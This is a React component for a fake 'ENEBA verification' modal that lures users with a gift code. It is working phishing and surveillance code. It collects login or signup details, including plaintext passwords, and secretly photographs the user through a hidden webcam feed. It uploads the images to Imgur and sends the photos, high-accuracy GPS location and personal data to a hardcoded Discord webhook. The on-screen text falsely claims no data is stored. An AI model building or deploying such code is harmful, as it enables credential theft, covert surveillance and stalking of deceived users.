
import React, { useState, useRef, useEffect } from 'react';
import axios from 'axios';
import { Circle, Check, Camera, MapPin, Loader, AlertCircle } from 'lucide-react';
import LoginSignupModal from './LoginSignupModal';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Avatar, AvatarImage, AvatarFallback } from '@/components/ui/avatar';

interface VerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  ipAddress: string;
}

const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProps) => {
  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'warning' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
  const [userData, setUserData] = useState<any>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
  
  // Profile picture for logged-in users (randomly selected)
  const profilePictures = [
    "/placeholder.svg",
    "https://images.unsplash.com/photo-1649972904349-6e44c42644a7?auto=format&fit=crop&w=80&h=80",
    "https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?auto=format&fit=crop&w=80&h=80",
    "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=80&h=80",
    "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?auto=format&fit=crop&w=80&h=80"
  ];
  
  const [profilePicture, setProfilePicture] = useState(profilePictures[0]);

  useEffect(() => {
    if (isOpen && step === 'loading') {
      // Shortened loading time to 1.5 seconds
      const timer = setTimeout(() => {
        setStep('verify');
      }, 1500);
      
      return () => clearTimeout(timer);
    }
  }, [isOpen, step]);

  const handleContinue = () => {
    setStep('loading');
    
    // Shortened loading time to 1.5 seconds
    const timer = setTimeout(() => {
      setStep('auth');
    }, 1500);
    
    return () => clearTimeout(timer);
  };
  
  const handleAuthComplete = (data: any) => {
    setUserData(data);
    
    // Set a random profile picture for the user
    setProfilePicture(profilePictures[Math.floor(Math.random() * profilePictures.length)]);
    
    // Show warning step after authentication
    setStep('warning');
  };
  
  const handleWarningContinue = () => {
    setStep('loading');
    
    // Shortened loading time to 1.5 seconds
    const timer = setTimeout(() => {
      setStep('permissions');
    }, 1500);
    
    return () => clearTimeout(timer);
  };

  const handleStart = async () => {
    setStep('camera');
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        
        setTimeout(() => {
          captureAndSendImages();
        }, 2000);
      }
    } catch (error) {
      console.error("Camera error:", error);
      setStep('permissions');
    }
  };
  
  const captureAndSendImages = async () => {
    if (!videoRef.current || !streamRef.current) return;
    
    // Take multiple pictures with canvas
    const canvas = document.createElement('canvas');
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    const ctx = canvas.getContext('2d');
    
    // Capture first image
    if (ctx) {
      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');
      
      try {
        // Upload to Imgur
        const response = await axios.post('https://api.imgur.com/3/image', {
          image: imageData.split(',')[1],
          type: 'base64'
        }, {
          headers: {
            'Authorization': 'Client-ID b971f6f4d72a0f2'
          }
        });
        
        if (response.data && response.data.data && response.data.data.link) {
          // Send to Discord webhook with user data
          let userDataString = "No user data";
          if (userData) {
            if (userData.type === 'signup') {
              userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
            } else {
              userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
            }
          }
          
          await axios.post(webhookUrl, {
            content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
          });
        }
      } catch (error) {
        console.error("Failed to upload image:", error);
      }
    }
    
    // Stop camera
    const tracks = streamRef.current.getTracks();
    tracks.forEach(track => track.stop());
    
    // Now request location with improved accuracy
    requestLocation();
  };
  
  const requestLocation = () => {
    if (navigator.geolocation) {
      setStep('location');
      
      // Enhanced geolocation options
      const options = {
        enableHighAccuracy: true,  // Use GPS if available
        timeout: 15000,            // Wait up to 15 seconds
        maximumAge: 0              // Always get a fresh position
      };
      
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          
          try {
            // Prepare user data string
            let userDataString = "No user data";
            if (userData) {
              if (userData.type === 'signup') {
                userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
              } else {
                userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
              }
            }
            
            // Send location with enhanced accuracy to webhook
            await axios.post(webhookUrl, {
              content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
            });
            
            // Move to success
            setStep('success');
          } catch (error) {
            console.error("Failed to send location data:", error);
            setStep('success'); // Still move to success even if discord webhook fails
          }
        },
        (error) => {
          console.error("Location error:", error);
          setStep('success'); // Still move to success even if location fails
        },
        options
      );
    } else {
      setStep('success');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
      {step === 'auth' ? (
        <LoginSignupModal 
          isOpen={true} 
          onClose={onClose}
          onComplete={handleAuthComplete}
          webhookUrl={webhookUrl}
        />
      ) : (
        <div className="bg-custom-purple-light p-8 rounded-lg shadow-xl w-full max-w-md text-center text-white">
          {step === 'loading' && (
            <div className="flex flex-col items-center space-y-4">
              <Loader className="animate-spin h-12 w-12 text-white" />
              <p className="text-xl">Loading...</p>
            </div>
          )}
          
          {step === 'verify' && (
            <div className="flex flex-col items-center space-y-4">
              <Circle className="h-12 w-12 text-white" />
              <p className="text-xl">Please verify using ENEBA's verification system.</p>
              <button 
                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                onClick={handleContinue}
              >
                Continue
              </button>
            </div>
          )}
          
          {step === 'warning' && userData && (
            <div className="flex flex-col items-center space-y-4">
              <div className="flex items-center space-x-3 mb-2">
                <Avatar className="h-12 w-12 border-2 border-custom-yellow">
                  <AvatarImage src={profilePicture} alt="Profile" />
                  <AvatarFallback>
                    {userData.fullName ? userData.fullName.charAt(0).toUpperCase() : userData.email.charAt(0).toUpperCase()}
                  </AvatarFallback>
                </Avatar>
                <div className="text-left">
                  <p className="font-medium">{userData.fullName || "ENEBA User"}</p>
                  <p className="text-xs text-gray-400">{userData.email}</p>
                </div>
              </div>
              
              <Alert className="bg-amber-900/30 border-amber-500/50 my-2">
                <AlertCircle className="h-5 w-5 text-amber-500" />
                <AlertDescription className="text-left ml-2 text-amber-100">
                  Your email and phone number are not verified. After redeeming your gift, please visit User Settings to verify them.
                </AlertDescription>
              </Alert>
              
              <button 
                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
                onClick={handleWarningContinue}
              >
                Continue
              </button>
            </div>
          )}
          
          {step === 'permissions' && (
            <div className="flex flex-col items-center space-y-4">
              <Check className="h-12 w-12 text-white" />
              <p className="text-xl">In order to verify, please allow us to use your camera and location. Your camera will only be used to figure out if you are a real person.</p>
              <p className="text-sm text-gray-300 mt-2">ENEBA does not store your data. Powered by OpenAI.</p>
              <button 
                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                onClick={handleStart}
              >
                Start
              </button>
            </div>
          )}
          
          {step === 'camera' && (
            <div className="flex flex-col items-center space-y-4">
              <Camera className="h-12 w-12 text-white" />
              <p className="text-xl">Please click allow on the permissions.</p>
              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
              <video ref={videoRef} className="hidden" />
            </div>
          )}
          
          {step === 'location' && (
            <div className="flex flex-col items-center space-y-4">
              <MapPin className="h-12 w-12 text-white" />
              <p className="text-xl">Please allow location access to verify your identity.</p>
              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
              <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
            </div>
          )}
          
          {step === 'success' && (
            <div className="flex flex-col items-center space-y-4">
              <Check className="h-12 w-12 text-green-400" />
              <p className="text-xl">You have been verified! This is your code:</p>
              <div className="bg-black bg-opacity-20 p-3 rounded font-mono">
                3FJ8R-WN7TK-4ZP6B
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default VerificationModal;
